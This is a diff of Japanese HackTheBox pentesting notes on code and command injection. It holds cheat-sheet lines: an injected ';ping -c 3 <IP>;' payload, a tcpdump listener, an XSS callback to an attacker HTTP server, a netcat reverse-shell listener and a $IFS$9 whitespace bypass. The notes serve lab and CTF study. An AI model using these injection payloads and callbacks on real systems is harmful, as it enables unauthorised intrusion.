@@ -3,12 +3,17 @@
 ## Code Injection
 Webサービスが使用可能であり、脆弱性が存在する場合は活用できる
 
-
-
 ### 疎通確認
-* tcpdump -i <ネットワークデバイス名> icmpでpingを受ける
-* ;ping -c 3 <受けのIPアドレス>; 等を挿入してpingが届くか
-※ HTBのVPNにつないでいればLAN内で完結する
+HTBのVPNにつないでいればLAN内で完結する
+
+#### ping
+* ```tcpdump -i <ネットワークデバイス名> icmpでping```を受ける
+* コマンドインジェクション等で```;ping -c 3 <受けのIPアドレス>; ```等を挿入してpingが届くか確認する
+
+#### http
+* ```python3 -m http.server -m 80```でhttp通信を受けられる
+* XSS等で攻撃対象でスクリプトを動かし```http://<ip>/```へアクセスさせてリクエストが届くか確認する
+
 
 ### Reverse Shell
 * nc -lvnp <ポート番号> で受ける
@@ -32,3 +37,4 @@ stty raw -echo; fg
 * 入力値に空白を使用できない場合、$IFS$9で代用できる
 
 https://www.ctfnote.com/web/os-command-injection/whitespace-bypass
+
